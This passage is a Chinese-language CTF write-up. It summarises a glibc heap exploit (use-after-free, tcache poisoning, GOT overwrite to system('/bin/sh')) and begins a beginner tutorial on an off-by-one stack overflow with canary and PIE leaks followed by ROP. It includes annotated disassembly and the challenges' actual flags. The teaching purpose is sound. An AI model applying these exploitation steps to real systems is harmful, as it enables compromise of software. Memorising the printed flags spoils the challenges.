版本差異}\label{ux5751-4glibc-ux7248ux672cux5deeux7570}

\begin{itemize}
\tightlist
\item
  \texttt{\_\allowbreak{}\_\allowbreak{}free\_\allowbreak{}hook} / \texttt{\_\allowbreak{}\_\allowbreak{}malloc\_\allowbreak{}hook} 在 \textbf{2.34+
  已移除} → 老教學的招式不能用。
\item
  safe-linking 從 \textbf{2.32} 開始，\texttt{next}
  是編碼過的，直接寫入目標位址會 crash。
\item
  \texttt{tcache-\allowbreak{}\textgreater{}\allowbreak{}counts} 在 2.30+ 是
  \textbf{uint16\_t}（一個 2 bytes），不是 1 byte， 用 gdb 讀
  \texttt{counts} 時要看對大小，不然會以為 offset 算錯。
\item
  tcache double free
  檢查（\texttt{e-\allowbreak{}\textgreater{}\allowbreak{}key\ \allowbreak{}==\ \allowbreak{}tcache\_\allowbreak{}key}）從 \textbf{2.29}
  開始。
\item
  不同 libc patch 的 \texttt{system} / \texttt{main\_\allowbreak{}arena} offset
  可能不同 → \textbf{一定要用 leak 反推 libc base，並用 GOT
  指紋確認版本}，千萬不要硬寫死。
\end{itemize}

\paragraph{\texorpdfstring{坑 5：\texttt{malloc}
的對齊要求}{坑 5：malloc 的對齊要求}}\label{ux5751-5malloc-ux7684ux5c0dux9f4aux8981ux6c42}

glibc 2.32+ 的 \texttt{tcache\_\allowbreak{}get} 有：

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{if} \OperatorTok{(}\NormalTok{\_\_unlikely}\OperatorTok{(!}\NormalTok{aligned\_OK}\OperatorTok{(}\NormalTok{e}\OperatorTok{)))}\NormalTok{ malloc\_printerr}\OperatorTok{(}\StringTok{"malloc(): unaligned tcache chunk detected"}\OperatorTok{);}
\end{Highlighting}
\end{Shaded}

\texttt{aligned\_\allowbreak{}OK} 要求 \textbf{16 bytes 對齊}。\texttt{0x4040c0}
剛好是 16 的倍數所以過關； 若毒化的目標位址不是 16 對齊就會直接 abort。

\paragraph{坑 6：canary
檢查的時機}\label{ux5751-6canary-ux6aa2ux67e5ux7684ux6642ux6a5f}

每個函式在 \texttt{ret} 前才檢查（\texttt{sub\ \allowbreak{}rax,\allowbreak{}\ \allowbreak{}fs:\allowbreak{}0x28}）。
本題我們完全不去改 stack，所以 canary 沒有影響； 但如果想改用
ROP，就必須先 leak stack（例如讀 libc 的 \texttt{environ}）
或想辦法不動到 canary。

\paragraph{\texorpdfstring{坑 7：\texttt{read()} 短讀（short
read）}{坑 7：read() 短讀（short read）}}\label{ux5751-7read-ux77edux8b80short-read}

\texttt{socket}/\texttt{pipe} 上的 \texttt{read()}
回傳「目前可用的位元組數」，不保證等於你要的長度。 本題 exploit
都只送很小的封包（\textless{} MSS），而且用 \texttt{recvuntil} 同步，
所以實際上不會短讀；但如果是自動化大量輸出，建議驗證
\texttt{{[}+{]}\ \allowbreak{}Deposited\ \allowbreak{}N\ \allowbreak{}bytes} 的 N
是否等於預期（我的第一版就有寫這個檢查）。

\paragraph{\texorpdfstring{坑 8：\texttt{assert}
過嚴導致誤判}{坑 8：assert 過嚴導致誤判}}\label{ux5751-8assert-ux904eux56b4ux5c0eux81f4ux8aa4ux5224}

我一開始寫
\texttt{assert\ \allowbreak{}leak\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}40\ \allowbreak{}==\ \allowbreak{}0x7f}，本地過、遠端失敗------
因為遠端 ASLR 把 libc 放在 \texttt{0x70...}！
正確的檢查是「頁對齊」與「低 12 bits 符合已知 offset」，而不是位址前綴。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{11. 一頁總結}\label{ux4e00ux9801ux7e3dux7d50}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
漏洞：Transfer(4) 會 free(src->ledger)，然後把「那個已 free 的指標」
      存進 dst->ledger，並讓 dst 保持 active → use-after-free +
      可連鎖觸發的 double free。

利用：UAF 讀 unsorted bin    → libc base       （偏移 0x203b20）
      UAF 讀空 tcache 鏈頭   → user 位址 >> 12  （safe-linking key；＝&e->next >> 12）
      UAF 寫清 tcache key + double free + 毒化 next
      → 第二次 malloc(0x20) 回傳 0x4040c0（slot 表）
      → 用 .bss 的假 wallet（0x4040a8）取得任意讀寫
      → strtol@got = system → 輸入 /bin/sh → shell
      → cat flag.txt → sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
\end{Verbatim}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\section{Part 6 --- pwn5
homemaker（ROP）}\label{part-6-pwn5-homemakerrop}

\begin{quote}
原始檔案：\texttt{pwn5/\allowbreak{}notes.\allowbreak{}md}
\end{quote}

\subsection{\texorpdfstring{SunshineCTF --- \texttt{homemaker} (Pwn /
堆疊溢位 + ROP)
完全新手教學筆記}{SunshineCTF --- homemaker (Pwn / 堆疊溢位 + ROP) 完全新手教學筆記}}\label{sunshinectf-homemaker-pwn-ux5806ux758aux6ea2ux4f4d-rop-ux5b8cux5168ux65b0ux624bux6559ux5b78ux7b46ux8a18}

\begin{quote}
這份筆記假設你\textbf{完全沒聽過 ROP / SROP}，只會一點 C
跟「暫存器」這個詞。 所有位址、offset 都是實際用 \texttt{objdump} 與
\texttt{gdb} 量出來的（指令與輸出都附在文件裡），沒有任何一個是猜的。
真實
flag：\texttt{sun\{\allowbreak{}the\_\allowbreak{}future\_\allowbreak{}is\_\allowbreak{}now\_\allowbreak{}today\_\allowbreak{}well\_\allowbreak{}wait\_\allowbreak{}how\_\allowbreak{}are\_\allowbreak{}you\_\allowbreak{}reading\_\allowbreak{}this\}\allowbreak{}}
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{0. 題目資訊}\label{ux984cux76eeux8cc7ux8a0a-4}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
項目
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
內容
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
題目 & \texttt{homemaker}（Apex Atomic Model 7 ``HOMEMAKER''
家事自動人偶） \\
類型 & pwn / 64-bit ELF、stack buffer overflow、off-by-one、ROP \\
本地檔案 & \texttt{./\allowbreak{}homemaker}（PIE、x86-64、stripped、有
canary、NX、Full RELRO） \\
遠端 & \texttt{chal.\allowbreak{}sunshinectf.\allowbreak{}games:\allowbreak{}26008}（Ubuntu 22.04 建置，glibc
2.35；本機是 Arch glibc 2.44） \\
編譯器 &
\texttt{GCC:\allowbreak{}\ \allowbreak{}(Ubuntu\ \allowbreak{}11.\allowbreak{}4.\allowbreak{}0-\allowbreak{}1ubuntu1\textasciitilde{}\allowbreak{}22.\allowbreak{}04.\allowbreak{}2)\ \allowbreak{}11.\allowbreak{}4.\allowbreak{}0}（字串裡就有） \\
保護 & PIE + Canary + NX + \textbf{Full RELRO} + 有
\texttt{endbr64}（CET 標記，但\textbf{未被強制啟用}） \\
漏洞 & \texttt{APPEND} 指令處理函式（offset \texttt{0x174c}）的
\textbf{off-by-one}：檢查 \texttt{n\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}capacity} 但迴圈寫了
\texttt{n+1} 個 byte，剛好蓋到 16-bit \texttt{capacity} 的低位 byte →
\texttt{0x0100} 變成 \texttt{0x01ff}（容量變大 255） \\
利用 & 用容量變大後的 \texttt{SEND\ \allowbreak{}STATE}（\texttt{0x1810}）洩漏
\texttt{0x1ff} bytes 堆疊（canary / saved rbp / 回傳位址 → PIE base）→
再 \texttt{APPEND} 一次蓋掉回傳位址 → ROP → \texttt{system("/\allowbreak{}bin/\allowbreak{}sh")} →
讀 flag \\
是否需要 libc & \textbf{不需要}！整條 ROP 只用題目自身的 PIE
位址（\texttt{system@plt} + 自己放 \texttt{/\allowbreak{}bin/\allowbreak{}sh}），所以本機 glibc
2.44 與遠端 2.35 都能打通 \\
\end{longtable}
}

\texttt{checksec} 輸出（\texttt{pwn\ \allowbreak{}checksec} / \texttt{pwntools}）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'$ORIGIN'
SHSTK:      Enabled      <-- 只是 ELF 標記，實際沒啟用（不然 ret 到非回傳位址會直接死）
IBT:        Enabled      <-- 同上
\end{Verbatim}

\begin{quote}
（\texttt{checksec} 的輸出順序就是上面這樣：\texttt{RELRO} →
\texttt{Stack} → \texttt{NX} → \texttt{PIE} → \texttt{RUNPATH} →
\texttt{SHSTK} → \texttt{IBT}。）
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{1.
保護機制：它們到底是什麼、對解題造成什麼影響}\label{ux4fddux8b77ux6a5fux5236ux5b83ux5011ux5230ux5e95ux662fux4ec0ux9ebcux5c0dux89e3ux984cux9020ux6210ux4ec0ux9ebcux5f71ux97ff}

\paragraph{1.1 ASLR（Address Space Layout
Randomization）}\label{aslraddress-space-layout-randomization}

每次程式啟動時，\textbf{堆疊、libc、執行檔本體（若是 PIE）、heap}
的位址都會被隨機平移一段。 所以「程式中某個變數在
\texttt{0x7ffc1234abcd}」這種位址每次都不一樣 →
你\textbf{不能寫死位址}，必須先「洩漏（leak）一個真實位址」，再用「相對位移」回推基底。

\paragraph{1.2 PIE（Position Independent
Executable）}\label{pieposition-independent-executable}

執行檔本身被編譯成「位置無關」，載入時整張 image 會被搬到隨機基底
\texttt{PIE\_\allowbreak{}base}。 \texttt{objdump} 看到的位址（例如 \texttt{main} 在
\texttt{0x1a7f}）都只是\textbf{檔案內的 offset}， 執行時真正的位址 =
\texttt{PIE\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x1a7f}。

\begin{quote}
\textbf{為什麼 PIE 需要先洩漏位址？} 因為 ROP 需要「gadget
的絕對位址」寫進堆疊。你不知道 \texttt{PIE\_\allowbreak{}base}，就不知道
\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret} 在哪裡。 本題靠洩漏堆疊上一個「指回 main
的回傳位址」（\texttt{PIE\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x1a9f}）來反推
\texttt{PIE\_\allowbreak{}base}（見 §5）。 驗證方式：\texttt{PIE\_\allowbreak{}base} 一定是 0x1000
對齊（page 對齊），洩漏值減掉 offset 後若剛好是
\texttt{xxxx000}，就代表算對了。
\end{quote}

\paragraph{1.3 Canary（Stack Guard /
堆疊金絲雀）}\label{canarystack-guard-ux5806ux758aux91d1ux7d72ux96c0}

每個函式開頭會把一個執行緒專屬的隨機 8 bytes 從
\texttt{fs:\allowbreak{}0x28}（TLS，Thread Local Storage）複製到堆疊
\texttt{{[}rbp-\allowbreak{}8{]}}； 函式結束前再比較一次，不一致就呼叫
\texttt{\_\allowbreak{}\_\allowbreak{}stack\_\allowbreak{}chk\_\allowbreak{}fail} → \texttt{abort()}（你會看到
\texttt{***\ \allowbreak{}stack\ \allowbreak{}smashing\ \allowbreak{}detected\ \allowbreak{}***}）。

組語長這樣（本題 \texttt{checksum} 函式起點是
\texttt{0x11e9}；下面是它載入金絲雀的那一段）：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{11ff: 64 48 8b 04 25 28 00 00 00   }\BuiltInTok{mov} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}   \CommentTok{; 拿出金絲雀}
\NormalTok{1208: 48 89 45 f8                  mov }\DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],}\KeywordTok{rax} \CommentTok{; 放到 [rbp{-}8]}
\NormalTok{...}
\NormalTok{1273: 48 8b 55 f8                  mov }\KeywordTok{rdx}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{]} \CommentTok{; 再讀回來}
\NormalTok{1277: 64 48 2b 14 25 28 00 00 00   }\BuiltInTok{sub} \KeywordTok{rdx}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}   \CommentTok{; 跟原始值比}
\NormalTok{1280: 74 05                        }\ControlFlowTok{je}  \DecValTok{1287}
\NormalTok{1282: e8 }\DecValTok{29}\NormalTok{ fe ff ff               call }\BaseNTok{10b}\ErrorTok{0} \OperatorTok{\textless{}}\NormalTok{\_\_stack\_chk\_fail}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\textbf{對解題的影響}：溢位時 \texttt{{[}rbp-\allowbreak{}8{]}} 會被你蓋掉 →
必須「原封不動寫回正確的金絲雀」。 因此\textbf{先 leak
金絲雀}是必要步驟（本題的金絲雀低位 byte 一定是
\texttt{0x00}，但我們是整條 8 bytes 洩漏出來的，不需要暴力猜）。

\paragraph{1.4 NX（No-eXecute，DEP）}\label{nxno-executedep}

資料段／堆疊／heap 被標成不可執行 → \textbf{不能把 shellcode
寫到堆疊上跳過去執行}。 所以我們改用 \textbf{ROP（Return-Oriented
Programming）}：借用程式自己已經存在的指令片段來組出攻擊邏輯。

\paragraph{1.5 RELRO / Full RELRO ------ 為什麼「GOT
覆寫」行不通}\label{relro-full-relro-ux70baux4ec0ux9ebcgot-ux8986ux5bebux884cux4e0dux901a}

\begin{itemize}
\tightlist
\item
  \textbf{GOT（Global Offset Table）}：動態連結的函式（如
  \texttt{system}、\texttt{read}）第一次被呼叫時，由 PLT 透過 GOT 跳到
  \texttt{ld.\allowbreak{}so} 解析真正的 libc 位址，然後把解析結果\textbf{寫回
  GOT}；第二次之後就直接從 GOT 跳。 於是傳統攻擊手法是：把
  \texttt{GOT{[}某函式{]}} 改成 \texttt{system}，再觸發那個函式 →
  直接拿到 shell。
\item
  \textbf{RELRO}：載入時把 GOT（以及
  \texttt{.\allowbreak{}init\_\allowbreak{}array}/\texttt{.\allowbreak{}fini\_\allowbreak{}array}/\texttt{.\allowbreak{}dynamic}）改成\textbf{唯讀}。

  \begin{itemize}
  \tightlist
  \item
    \emph{Partial RELRO}：只保護 \texttt{.\allowbreak{}init\_\allowbreak{}array} 等，GOT 仍可寫 →
    可以 GOT 覆寫。
  \item
    \textbf{Full RELRO}：連 \texttt{.\allowbreak{}got.\allowbreak{}plt} 都在載入時全部解析完並
    \texttt{mprotect(PROT\_\allowbreak{}READ)} → \textbf{GOT 完全不能寫}。
  \end{itemize}
\end{itemize}

本題 \texttt{checksec} 顯示 \texttt{Full\ \allowbreak{}RELRO}，而且
\texttt{readelf\ \allowbreak{}-\allowbreak{}r} 顯示 \texttt{.\allowbreak{}rela.\allowbreak{}plt} 有 6 個
\texttt{R\_\allowbreak{}X86\_\allowbreak{}64\_\allowbreak{}JUMP\_\allowbreak{}SLO}（\texttt{write/\allowbreak{}system/\allowbreak{}read/\allowbreak{}memcpy/\allowbreak{}setvbuf/\allowbreak{}\_\allowbreak{}\_\allowbreak{}stack\_\allowbreak{}chk\_\allowbreak{}fail}），全部在載入時就被填好。

\begin{quote}
結論：\textbf{GOT 覆寫這條路直接封死}。但 Full RELRO
有個副作用對我們有利： \textbf{所有 PLT
項目都已解析完成}，所以你隨時可以直接
\texttt{call\ \allowbreak{}system@plt}（不需要先觸發一次）。
\end{quote}

\paragraph{1.6 CET（SHSTK /
IBT）在這裡不影響}\label{cetshstk-ibtux5728ux9019ux88e1ux4e0dux5f71ux97ff}

\texttt{readelf}/\texttt{checksec} 會說
\texttt{SHSTK:\allowbreak{}\ \allowbreak{}Enabled,\allowbreak{}\ \allowbreak{}IBT:\allowbreak{}\ \allowbreak{}Enabled}，那只是編譯器加了
\texttt{endbr64} 與 GNU property 標記。 Shadow
Stack（SHSTK）若真的啟用，\texttt{ret} 只能回到「真正的回傳位址」，ROP
會失效；但 Linux distro 預設\textbf{沒有}啟用（需要 CPU 支援 + 核心 +
glibc 都開）。 本題實測 ROP 可用（local 與 remote
都成功），所以可以放心。 另外 \textbf{IBT 只檢查間接
\texttt{call}/\texttt{jmp} 的目標，不檢查
\texttt{ret}}，所以我們用「未對齊的 gadget」（見 §6）也是合法的。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{2.
逆向總覽：程式在做什麼}\label{ux9006ux5411ux7e3dux89bdux7a0bux5f0fux5728ux505aux4ec0ux9ebc}

stripped（無符號），所以只能靠 \texttt{objdump} +
交叉比對。函式地圖（\textbf{都是 PIE 相對 offset}）：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
offset
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
我給的名字
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
功能
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{0x11e9} & \texttt{checksum(buf,\allowbreak{}\ \allowbreak{}len)} & 8-bit CRC（多項式
\texttt{0x2f}），回傳 1 byte \\
\texttt{0x1289} & \texttt{validate(magic)} &
\texttt{magic\ \allowbreak{}==\ \allowbreak{}0x1337c35f} 回 0，否則 -1 \\
\texttt{0x12d2} & \texttt{cmd\_\allowbreak{}echo()} &
\texttt{system("/\allowbreak{}bin/\allowbreak{}echo\ \allowbreak{}-\allowbreak{}n\ \allowbreak{}\textquotesingle{}\allowbreak{}\textquotesingle{}\allowbreak{}")} \\
\texttt{0x1313} & \texttt{readn(buf,\allowbreak{}\ \allowbreak{}len)} & 從 \textbf{fd 0} 迴圈
\texttt{read} 到收滿 \texttt{len} bytes \\
\texttt{0x13a2} & \texttt{send\_\allowbreak{}frame(status,\allowbreak{}\ \allowbreak{}data,\allowbreak{}\ \allowbreak{}len)} & 打包成
\texttt{ESC{[}} 訊框寫到 \textbf{fd 1} \\
\texttt{0x14cc} & \texttt{recv\_\allowbreak{}frame(outbuf,\allowbreak{}\ \allowbreak{}*outlen,\allowbreak{}\ \allowbreak{}*err)} & 從 fd
0 解析一個訊框 \\
\texttt{0x167c} & \texttt{auth(state,\allowbreak{}\ \allowbreak{}payload,\allowbreak{}\ \allowbreak{}len)} &
「服務鑰匙卡」檢查；成功則寫入 \texttt{capacity=0x100} \\
\texttt{0x174c} & \texttt{append(state,\allowbreak{}\ \allowbreak{}payload,\allowbreak{}\ \allowbreak{}len)} &
\textbf{漏洞所在}：把 payload 資料寫進 \texttt{state{[}{]}} \\
\texttt{0x1810} & \texttt{send\_\allowbreak{}state(state)} &
\texttt{send\_\allowbreak{}frame(0,\allowbreak{}\ \allowbreak{}state,\allowbreak{}\ \allowbreak{}state{[}0x100{]})} →
\textbf{洩漏堆疊} \\
\texttt{0x1865} & \texttt{service\_\allowbreak{}loop()} & 主迴圈：收訊框 → 依 opcode
分派 \\
\texttt{0x1a7f} & \texttt{main()} & 呼叫 \texttt{service\_\allowbreak{}loop()} \\
\texttt{0x1aba} & \texttt{init()} &
\texttt{setvbuf(stdout/\allowbreak{}stderr,\allowbreak{}\ \allowbreak{}NULL,\allowbreak{}\ \allowbreak{}\_\allowbreak{}IONBF,\allowbreak{}\ \allowbreak{}0)} \\
\end{longtable}
}

\paragraph{2.1 通訊協定（ESC
訊框）}\label{ux901aux8a0aux5354ux5b9aesc-ux8a0aux6846}

\textbf{客戶端 → 伺服器}（\texttt{recv\_\allowbreak{}frame}
解析，長度欄位是\textbf{大端序 big-endian}！）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
+--------+--------+---------------------+--------+--------+
| 1b 5b  | LL LL  | payload (L bytes)   |  crc   | 1b 5c  |
|  ESC[  | L 大端 | payload[0]=opcode   | CRC8   |  ESC\  |
+--------+--------+---------------------+--------+--------+
   4 bytes header     L bytes          1 byte    2 bytes
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \texttt{L} 限制：\texttt{L\ \allowbreak{}!=\ \allowbreak{}0} 且
  \texttt{L+7\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0x800} → \textbf{L 最大 0x7f9}。
\item
  \texttt{crc\ \allowbreak{}=\ \allowbreak{}checksum(payload,\allowbreak{}\ \allowbreak{}L)}，用 §5.1 的演算法自己算。
\end{itemize}

\textbf{伺服器 → 客戶端}（\texttt{send\_\allowbreak{}frame} 產生，\textbf{同一個
parser 可以解析}）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
ESC[ | (len+1) 大端 | status | data(len bytes) | crc | ESC\
\end{Verbatim}

也就是說：伺服器訊框的「status」欄位正好對應客戶端訊框的「opcode」欄位，協定是對稱的。

\paragraph{\texorpdfstring{2.2 opcode 分派表（jump table @
\texttt{.\allowbreak{}rodata:\allowbreak{}0x21c8}）}{2.2 opcode 分派表（jump table @ .rodata:0x21c8）}}\label{opcode-ux5206ux6d3eux8868jump-table-.rodata0x21c8}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{1958: 89 c0                  mov    }\KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}
\NormalTok{195a: 48 8d 14 85 00 00 00 00  }\BuiltInTok{lea}  \KeywordTok{rdx}\OperatorTok{,[}\KeywordTok{rax}\OperatorTok{*}\DecValTok{4}\OperatorTok{+}\BaseNTok{0x0}\OperatorTok{]}
\NormalTok{1962: 48 8d 05 5f 08 00 00   }\BuiltInTok{lea}    \KeywordTok{rax}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x85f}\OperatorTok{]}   \OperatorTok{\#} \DecValTok{21}\ErrorTok{c8}
\NormalTok{1969: 8b 04 02               }\BuiltInTok{mov}    \KeywordTok{eax}\OperatorTok{,}\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdx}\OperatorTok{+}\KeywordTok{rax}\OperatorTok{*}\DecValTok{1}\OperatorTok{]}
\NormalTok{196c: 48 98                  }\BuiltInTok{cdqe}
\NormalTok{196e: 48 8d 15 53 08 00 00   }\BuiltInTok{lea}    \KeywordTok{rdx}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x853}\OperatorTok{]}   \OperatorTok{\#} \DecValTok{21}\ErrorTok{c8}
\NormalTok{1975: 48 01 d0               add    }\KeywordTok{rax}\OperatorTok{,}\KeywordTok{rdx}
\NormalTok{1978: 3e ff e0               notrack jmp }\KeywordTok{rax}
\end{Highlighting}
\end{Shaded}

\texttt{.\allowbreak{}rodata} 內容（\texttt{0x21c8} 起 6 個 int32，內容是「相對
0x21c8 的位移」）：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
opcode
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
表內值
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
目標
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
意義
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
0 & \texttt{0xfffff887} (-1913) & \texttt{0x1a4f} & 非法指令 → 回應
status \texttt{0xe7} \\
1 & \texttt{0xfffff7b3} (-2125) & \texttt{0x197b} &
\textbf{AUTH}（唯一不需要先登入的指令） \\
2 & \texttt{0xfffff80c} (-2036) & \texttt{0x19d4} &
\textbf{APPEND}（漏洞） \\
3 & \texttt{0xfffff845} (-1979) & \texttt{0x1a0d} & \textbf{SEND
STATE}（洩漏） \\
4 & \texttt{0xfffff871} (-1935) & \texttt{0x1a39} &
\textbf{EJECT}：離開迴圈 → \texttt{main} 返回 → \textbf{觸發 ROP} \\
5 & \texttt{0xfffff856} (-1962) & \texttt{0x1a1e} &
\textbf{ECHO}：\texttt{system("/\allowbreak{}bin/\allowbreak{}echo\ \allowbreak{}-\allowbreak{}n\ \allowbreak{}\textquotesingle{}\allowbreak{}\textquotesingle{}\allowbreak{}")}（固定的字串，\textbf{沒有注入點}） \\
\end{longtable}
}

\begin{quote}
注意：題目給的提示說
\texttt{/\allowbreak{}bin/\allowbreak{}echo\ \allowbreak{}-\allowbreak{}n\ \allowbreak{}\textquotesingle{}\allowbreak{}\textquotesingle{}\allowbreak{}} 可能是
command injection。 \textbf{逆向後確認它是寫死的
\texttt{lea\ \allowbreak{}rax,{[}rip+0xec2{]}}（指向
\texttt{.\allowbreak{}rodata:\allowbreak{}0x21b6}）}，沒有任何使用者輸入被接進字串， 所以
(d)「shell 注入」是假線索，真正的是 (b)/(c) 類的\textbf{記憶體破壞}。
\end{quote}

登入檢查（\texttt{0x191c}）：\texttt{if\ \allowbreak{}(payload{[}0{]}\ \allowbreak{}!=\ \allowbreak{}1\ \allowbreak{}\&\allowbreak{}\&\allowbreak{}\ \allowbreak{}!authed)\ \allowbreak{}→\ \allowbreak{}status\ \allowbreak{}0xe6\ \allowbreak{}"not\ \allowbreak{}authenticated"}。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{3.
基礎補課：讀組語前一定要知道的事}\label{ux57faux790eux88dcux8ab2ux8b80ux7d44ux8a9eux524dux4e00ux5b9aux8981ux77e5ux9053ux7684ux4e8b}

\paragraph{3.1 x86-64
常用暫存器}\label{x86-64-ux5e38ux7528ux66abux5b58ux5668}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
暫存器
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
用途
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
本題重點
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{rax} & 回傳值 / 累加器 & 函式回傳值放這裡（例如
\texttt{checksum} 回傳的 CRC） \\
\texttt{rdi} & \textbf{第 1 個參數} & \texttt{system("/\allowbreak{}bin/\allowbreak{}sh")}
的字串指標必須放這裡 \\
\texttt{rsi} & 第 2 個參數 & \texttt{memcpy} 的來源、\texttt{read} 的
buffer \\
\texttt{rdx} & 第 3 個參數 & \texttt{memcpy}/\texttt{read} 的長度 \\
\texttt{rcx}, \texttt{r8}, \texttt{r9} & 第 4\textasciitilde6 個參數
& \\
\texttt{rbp} & frame pointer（此函式堆疊框架的基準） & 區域變數都用
\texttt{{[}rbp-\allowbreak{}XX{]}} 表示 \\
\texttt{rsp} & stack pointer（堆疊頂端，永遠指向「最後壓入的東西」） &
\texttt{push} 會減 8，\texttt{pop} 會加 8 \\
\texttt{rip} & 下一道要執行的指令位址 & ROP 就是控制 \texttt{rip} \\
\texttt{fs} & 執行緒區域儲存區基底 & 金絲雀在 \texttt{fs:\allowbreak{}0x28} \\
\end{longtable}
}

命名規則：\texttt{eax} = \texttt{rax} 的低 32 bits，\texttt{ax} = 低 16
bits，\texttt{al} = 低 8 bits。
\texttt{movzx\ \allowbreak{}eax,\allowbreak{}\ \allowbreak{}WORD\ \allowbreak{}PTR\ \allowbreak{}{[}..{]}} = 「讀 2 bytes 零擴展成 32
bits」（不會把高位垃圾帶進來）。

\paragraph{3.2 System V AMD64 呼叫慣例（Linux x86-64
的函式呼叫規則）}\label{system-v-amd64-ux547cux53ebux6163ux4f8blinux-x86-64-ux7684ux51fdux5f0fux547cux53ebux898fux5247}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  前 6 個整數/指標參數依序放
  \textbf{\texttt{rdi,\allowbreak{}\ \allowbreak{}rsi,\allowbreak{}\ \allowbreak{}rdx,\allowbreak{}\ \allowbreak{}rcx,\allowbreak{}\ \allowbreak{}r8,\allowbreak{}\ \allowbreak{}r9}}，第 7
  個之後才放堆疊。
\item
  回傳值放 \texttt{rax}。
\item
  呼叫端用 \texttt{call}：它會\textbf{自動把回傳位址 push
  到堆疊}（\texttt{rsp\ \allowbreak{}-=\ \allowbreak{}8}）然後跳到目標。
\item
  被呼叫的函式結尾用 \texttt{ret}：它會\textbf{從堆疊 pop 一個 8 bytes
  當作新 \texttt{rip}}（\texttt{rsp\ \allowbreak{}+=\ \allowbreak{}8}）。
\item
